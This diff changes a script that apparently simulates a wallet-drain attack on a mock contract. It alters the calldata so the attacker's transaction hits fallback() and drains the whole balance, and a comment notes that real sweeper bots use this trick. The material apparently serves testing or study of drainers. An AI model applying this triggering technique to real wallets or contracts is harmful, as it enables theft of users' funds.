@@ -198,7 +198,11 @@ const balBeforeDrain = await balOf(victim.address);
 const triggerTxHash = await attackerClient.sendTransaction({
   to: victim.address,
   value: parseEther("0.0001"),
-  data: "0x",
+  // Non-empty calldata that doesn't match any selector forces dispatch into
+  // fallback() (not receive()). CrimeEnjoyorMock's fallback drains the
+  // ENTIRE balance, while receive() only forwards msg.value. Real-world
+  // sweeper-bot drains tend to call with crafted data for this reason.
+  data: "0xdeadbeef",
 });
 console.log(`  trigger tx: ${triggerTxHash}`);
 await attackerClient.waitForTransactionReceipt({ hash: triggerTxHash });
